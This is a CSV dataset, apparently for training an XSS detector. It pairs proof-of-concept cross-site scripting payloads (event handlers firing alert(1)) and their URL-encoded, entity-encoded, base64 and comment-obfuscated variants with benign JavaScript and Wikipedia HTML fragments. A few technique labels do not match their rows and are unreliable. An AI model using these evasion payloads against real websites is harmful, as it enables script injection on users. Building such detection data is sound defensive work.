payload_original,payload_obfuscated,label,technique
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,%3Cisindex%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fisindex%3E,1,urlencode
<listing onpointerleave=alert(1)>xss</listing>,&lt;listing onpointerleave=alert(1)&gt;xss&lt;/listing&gt;,1,html_entities
} } _iscurrentlyfixed() {,} } _iscurrentlyfixed() {,0,none
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>","<style>@keyframes x{}</style><cite s/*OBF*/tyle=""animation-name:x"" onanimationstart=""alert(1)""></cite>",1,comment_marker
<figure onpointermove=alert(1)>xss</figure>,&lt;figure onpointermove=alert(1)&gt;xss&lt;/figure&gt;,1,html_entities
if (originaltypeevent in customevents) {,if (originaltypeevent in customevents) {,0,none
const event_show$6 = `show${event_key$7}`,const event_show$6 = `show${event_key$7}`,0,none
"key: ""_removethumb"", value: function _removethumb() { $(this.thumb).remove();","key: ""_removethumb"", value: function _removethumb() { $(this.thumb).remove();",0,none
"<dt><a class=""reference internal"" href=""topics/api.html""><span class=""doc"">core api","<dt><a class=""reference internal"" href=""topics/api.html""><span class=""doc"">core api",0,none
"<li id=""cite_note-turing_test-351""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-turing_test_351-0"">^ </a> </b>","<li id=""cite_note-turing_test-351""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-turing_test_351-0"">^ </a> </b>",0,none
execute(this._config.clickcallback); }); this._isappended = true;,execute(this._config.clickcallback); }); this._isappended = true;,0,none
"}; var tests = { 'step': { r: false, t: teststep },","}; var tests = { 'step': { r: false, t: teststep },",0,none
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHVsIG9uZHJvcD1hbGVydCgxKSBjb250ZW50ZWRpdGFibGU+ZHJvcCBoZXJlPC91bD4=,1,base64
"scale: 0.4, translatey: _this50.offsety, translatex: _this50.offsetx,","scale: 0.4, translatey: _this50.offsety, translatex: _this50.offsetx,",0,none
"], dest: 'temp/js/materialize_concat.js' }","], dest: 'temp/js/materialize_concat.js' }",0,none
<option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>,&lt;option id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/option&gt;&lt;input autofocus&gt;,1,html_entities
<hr onpointerover=alert(1)>xss</hr>,&lt;hr onpointerover=alert(1)&gt;xss&lt;/hr&gt;,1,html_entities
"<li id=""cite_note-252""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-252"">^ </a> </b>","<li id=""cite_note-252""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-252"">^ </a> </b>",0,none
"<progress onmouseout=""alert(1)"">test</progress>","< progress onmouseout=""alert(1) "">test< /progress>  ",1,whitespace_noise
"var handlenumber = false; scope_handles.foreach(function(handle, index){ if ( handle.hasattribute('disabled') ) {","var handlenumber = false; scope_handles.foreach(function(handle, index){ if ( handle.hasattribute('disabled') ) {",0,none
"<object onmouseover=""alert(1)"">test</object>",&lt;object onmouseover=&quot;alert(1)&quot;&gt;test&lt;/object&gt;,1,html_entities
} }); var renderresults = function(results) {,} }); var renderresults = function(results) {,0,none
"throw new typeerror(`${name$a.touppercase()}: option ""reference"" provided type ""object"" without a required ""getboundingclientrect"" method.`); } return config;","throw new typeerror(`${name$a.touppercase()}: option ""reference"" provided type ""object"" without a required ""getboundingclientrect"" method.`); } return config;",0,none
nextelement.classlist.add(class_name_active),nextelement.classlist.add(class_name_active),0,none
"parent.replacechild(wrapper, el); wrapper.appendchild(el); }","parent.replacechild(wrapper, el); wrapper.appendchild(el); }",0,none
"<pre onmouseover=""alert(1)"">test</pre>","<pre onmouseover=""alert(1)"">test</  pre>",1,whitespace_noise
"<header onmousedown=""alert(1)"">test</header>",PGhlYWRlciBvbm1vdXNlZG93bj0iYWxlcnQoMSkiPnRlc3Q8L2hlYWRlcj4=,1,base64
} } definejqueryplugin(popover);,} } definejqueryplugin(popover);,0,none
"} window.removeeventlistener('resize', this._handlethrottledresizebound); }","} window.removeeventlistener('resize', this._handlethrottledresizebound); }",0,none
"<footer onmouseout=""alert(1)"">test</footer>",%3Cfooter%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,1,urlencode
} if (summary === null) { return false;,} if (summary === null) { return false;,0,none
"if (_this53.options.mindate) _this53.options.mindate.sethours(0, 0, 0, 0)","if (_this53.options.mindate) _this53.options.mindate.sethours(0, 0, 0, 0)",0,none
"<source onmousedown=""alert(1)"">test</source>","<source onmousedown=""alert(1)"">test</s/*OBF*/ource>",1,comment_marker
"<a href=""&#0000106avascript:alert(1)"">xss</a>","<a href=""&#0000106avascript:alert(1)"">xss</a>",1,comment_marker
"plugin.init(this, arguments[0])","plugin.init(this, arguments[0])",0,none
if (this.ishovered || this.isfocused) {,if (this.ishovered || this.isfocused) {,0,none
} addchip(chip) { if (!this._isvalid(chip) || this.chipsdata.length >= this.options.limit) {,} addchip(chip) { if (!this._isvalid(chip) || this.chipsdata.length >= this.options.limit) {,0,none
"<sup onkeyup=""alert(1)"" contenteditable>test</sup>",%3Csup%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fsup%3E,1,urlencode
"var x = void 0, y = void 0, delta = void 0,","var x = void 0, y = void 0, delta = void 0,",0,none
"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",PHJ1Ynkgb25wYXN0ZT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9ydWJ5Pg==,1,base64
"<h3><span class=""mw-headline"" id=""planning"">planning","<h3><span class=""mw-headline"" id=""planning"">planning",0,none
<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>,PGZyYW1lc2V0IGlkPXggdGFiaW5kZXg9MSBvbmRlYWN0aXZhdGU9YWxlcnQoMSk+PC9mcmFtZXNldD48aW5wdXQgaWQ9eSBhdXRvZm9jdXM+,1,base64
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",%3Ctd%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%3Etest%3C%2Ftd%3E,1,urlencode
"<footer oncopy=""alert(1)"" contenteditable>test</footer>","<footer oncopy=""  alert(1)"" contenteditable>test</footer>",1,whitespace_noise
"} for (const sel of selectorengine.find(selector, this._element)) { callback(sel);","} for (const sel of selectorengine.find(selector, this._element)) { callback(sel);",0,none
"<p><a href=""/wiki/joseph_weizenbaum"" title=""joseph weizenbaum"">joseph weizenbaum </a> wrote that ai applications cannot, by definition, successfully simulate genuine human empathy and that the use of ai technology in fields such as <a href=""/wiki/customer_service"" title=""customer service"">customer service </a> or <a href=""/wiki/psychotherapy"" title=""psychotherapy"">psychotherapy </a><sup id=""cite_ref-380"" class=""reference""><a href=""#cite_note-380"">&#91;369&#93; </a> </sup> was deeply misguided. weizenbaum was also bothered that ai researchers (and some philosophers) were willing to view the human mind as nothing more than a computer program (a position now known as <a href=""/wiki/computationalism"" class=""mw-redirect"" title=""computationalism"">computationalism </a>). to weizenbaum these points suggest that ai research devalues human life.<sup id=""cite_ref-weizenbaum&#39;s_critique_381-0"" class=""reference""><a href=""#cite_note-weizenbaum&#39;s_critique-381"">&#91;370&#93; </a> </sup>","<p><a href=""/wiki/joseph_weizenbaum"" title=""joseph weizenbaum"">joseph weizenbaum </a> wrote that ai applications cannot, by definition, successfully simulate genuine human empathy and that the use of ai technology in fields such as <a href=""/wiki/customer_service"" title=""customer service"">customer service </a> or <a href=""/wiki/psychotherapy"" title=""psychotherapy"">psychotherapy </a><sup id=""cite_ref-380"" class=""reference""><a href=""#cite_note-380"">&#91;369&#93; </a> </sup> was deeply misguided. weizenbaum was also bothered that ai researchers (and some philosophers) were willing to view the human mind as nothing more than a computer program (a position now known as <a href=""/wiki/computationalism"" class=""mw-redirect"" title=""computationalism"">computationalism </a>). to weizenbaum these points suggest that ai research devalues human life.<sup id=""cite_ref-weizenbaum&#39;s_critique_381-0"" class=""reference""><a href=""#cite_note-weizenbaum&#39;s_critique-381"">&#91;370&#93; </a> </sup>",0,none
"} _removetemporaryeventhandlers() { document.body.removeeventlistener('click', this._handledocumentclickbound, true);","} _removetemporaryeventhandlers() { document.body.removeeventlistener('click', this._handledocumentclickbound, true);",0,none
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",%3Csup%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fsup%3E,1,urlencode
this.isopen = false; this.$anchor = this.$el.children('a').first(); this.$menu = this.$el.children('ul').first();,this.isopen = false; this.$anchor = this.$el.children('a').first(); this.$menu = this.$el.children('ul').first();,0,none
value: function _setup() {,value: function _setup() {,0,none
"<command onmousedown=""alert(1)"">test</command>",%3Ccommand%20onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fcommand%3E,1,urlencode
</span></a></dt><dd>write your first scrapy project.</dd>,</span></a></dt><dd>write your first scrapy project.</dd>,0,none
"key: ""draw"", value: function draw(force) { if (!this.isopen && !force) {","key: ""draw"", value: function draw(force) { if (!this.isopen && !force) {",0,none
<output onpointerenter=alert(1)>xss</output>,<o/*OBF*/utput onpointere/*OBF*/nter=alert(1)>xss</outp/*OBF*/ut>,1,comment_marker
index_js.definejqueryplugin(offcanvas),index_js.definejqueryplugin(offcanvas),0,none
var $tabswrapper = this._tabscarousel.$el; this._tabscarousel.destroy(); $tabswrapper.after($tabswrapper.children());,var $tabswrapper = this._tabscarousel.$el; this._tabscarousel.destroy(); $tabswrapper.after($tabswrapper.children());,0,none
<footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>,PGZvb3RlciBvbmZvY3Vzb3V0PWFsZXJ0KDEpIHRhYmluZGV4PTEgaWQ9eD48L2Zvb3Rlcj48aW5wdXQgYXV0b2ZvY3VzPg==,1,base64
"return a.setattribute(c, d)","return a.setattribute(c, d)",0,none
"</span> <span class=""toctext"">computationalism and functionalism","</span> <span class=""toctext"">computationalism and functionalism",0,none
return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime()) ); },return (/date/.test(object.prototype.tostring.call(obj)) && !isnan(obj.gettime()) ); },0,none
const trigger_hover = 'hover',const trigger_hover = 'hover',0,none
"this.el.removeeventlistener('touchmove', this._handleclosedragbound); this.el.removeeventlistener('touchend', this._handleclosereleasebound); this.el.removeeventlistener('click', this._handleclosetriggerclickbound);","this.el.removeeventlistener('touchmove', this._handleclosedragbound); this.el.removeeventlistener('touchend', this._handleclosereleasebound); this.el.removeeventlistener('click', this._handleclosetriggerclickbound);",0,none
"eventhandler.trigger(this._element, event_closed)","eventhandler.trigger(this._element, event_closed)",0,none
} _handledragtargetdrag(e) { if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) {,} _handledragtargetdrag(e) { if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) {,0,none
<textarea onselect=alert(1) autofocus>xss</textarea>,PHRleHRhcmVhIG9uc2VsZWN0PWFsZXJ0KDEpIGF1dG9mb2N1cz54c3M8L3RleHRhcmVhPg==,1,base64
"activeindicator.removeattribute('aria-current'); const newactiveindicator = selectorengine.findone(`[data-bs-slide-to=""${index}""]`, this._indicatorselement); if (newactiveindicator) {","activeindicator.removeattribute('aria-current'); const newactiveindicator = selectorengine.findone(`[data-bs-slide-to=""${index}""]`, this._indicatorselement); if (newactiveindicator) {",0,none
<abbr onpointerenter=alert(1)>xss</abbr>,&lt;abbr onpointerenter=alert(1)&gt;xss&lt;/abbr&gt;,1,html_entities
"<script onkeyup=""alert(1)"" contenteditable>test</script>",%3Cscript%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fscript%3E,1,urlencode
"constructor(el, options) { super(parallax, el, options); this.el.m_parallax = this;","constructor(el, options) { super(parallax, el, options); this.el.m_parallax = this;",0,none
<input onpointerout=alert(1)>xss</input>,<input onpointerout=alert(1)>xss</input>,1,whitespace_noise
return unique(elems),return unique(elems),0,none
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165842/http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">""cto corner: artificial intelligence use in financial services – financial services roundtable"" </a>. <i>financial services roundtable </i>. 2 april 2015. archived from <a rel=""nofollow"" class=""external text"" href=""http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">the original </a> on 18 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">18 november","</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165842/http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">""cto corner: artificial intelligence use in financial services – financial services roundtable"" </a>. <i>financial services roundtable </i>. 2 april 2015. archived from <a rel=""nofollow"" class=""external text"" href=""http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">the original </a> on 18 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">18 november",0,none
"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname); this._issliding = false; triggerevent(event_slid);","activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname); this._issliding = false; triggerevent(event_slid);",0,none
this._keysselected[key] = true,this._keysselected[key] = true,0,none
<abbr onpointerdown=alert(1)>xss</abbr>,&lt;abbr onpointerdown=alert(1)&gt;xss&lt;/abbr&gt;,1,html_entities
"}; class materialbox extends component { constructor(el, options) {","}; class materialbox extends component { constructor(el, options) {",0,none
<meter onpointerenter=alert(1)>xss</meter>,%3Cmeter%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fmeter%3E,1,urlencode
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,&lt;form onfocusout=alert(1) tabindex=1 id=x&gt;&lt;/form&gt;&lt;input autofocus&gt;,1,html_entities
"<li><a href=""/wiki/semantics_(computer_science)"" title=""semantics (computer science)"">semantics </a> </li> </ul>","<li><a href=""/wiki/semantics_(computer_science)"" title=""semantics (computer science)"">semantics </a> </li> </ul>",0,none
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,%3Cbdo%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fbdo%3E,1,urlencode
this._settabsandtabwidth(); this._animateindicator(previndex); e.preventdefault();,this._settabsandtabwidth(); this._animateindicator(previndex); e.preventdefault();,0,none
"a.key.tolowercase(), b.key.tolowercase(), val.tolowercase()","a.key.tolowercase(), b.key.tolowercase(), val.tolowercase()",0,none
<colgroup onpointerleave=alert(1)>xss</colgroup>,%3Ccolgroup%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fcolgroup%3E,1,urlencode
let scrolltop = container.scrolltop; let scrolledx = bounding.left - scrollleft; let scrolledy = bounding.top - scrolltop;,let scrolltop = container.scrolltop; let scrolledx = bounding.left - scrollleft; let scrolledy = bounding.top - scrolltop;,0,none
_this29.timeremaining -= 20; } if (_this29.timeremaining <= 0) {,_this29.timeremaining -= 20; } if (_this29.timeremaining <= 0) {,0,none
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Ch1%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fh1%3E,1,urlencode
"<li id=""cite_note-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;-348""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;_348-0"">^ </a> </b>","<li id=""cite_note-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;-348""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;_348-0"">^ </a> </b>",0,none
return element; } return m.getoverflowparent(element.parentelement);,return element; } return m.getoverflowparent(element.parentelement);,0,none
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PHRkIGlkPXggc3R5bGU9InRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC90ZD4=,1,base64
